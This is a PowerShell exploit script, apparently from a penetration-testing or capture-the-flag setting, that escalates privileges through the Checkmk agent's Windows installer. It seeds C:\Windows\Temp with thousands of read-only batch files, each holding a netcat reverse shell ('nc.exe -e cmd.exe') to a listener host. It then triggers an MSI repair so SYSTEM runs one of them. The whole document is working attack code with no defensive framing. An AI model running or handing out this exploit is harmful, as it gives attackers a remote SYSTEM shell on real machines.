param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.16.142",
    [string]$LPORT = "9001"
)

# --- Configuration ---
$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# --- 1. Find the MSI trigger ---
Write-Host "[*] Searching for Checkmk MSI package..."
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage

if (!$msi) {
    Write-Error "[-] Could not find Checkmk MSI. Is it installed?"
    return
}

Write-Host "[+] Found MSI at: $msi"

# --- 2. Spray the Read-Only files ---
Write-Host "[*] Seeding malicious batch files (PIDs $MinPID to $MaxPID)..."

foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            # Create the file with the reverse shell payload
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            
            # Set Read-Only attribute (Critical for the exploit)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {
            # Suppress errors for existing files
        }
    }
}

Write-Host "[+] Seeding complete."

# --- 3. Launch the trigger ---
Write-Host "[*] Triggering MSI repair (this may take a moment)..."

Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log"

Write-Host "[+] Trigger sent! Check your listener on $LHOST:$LPORT"
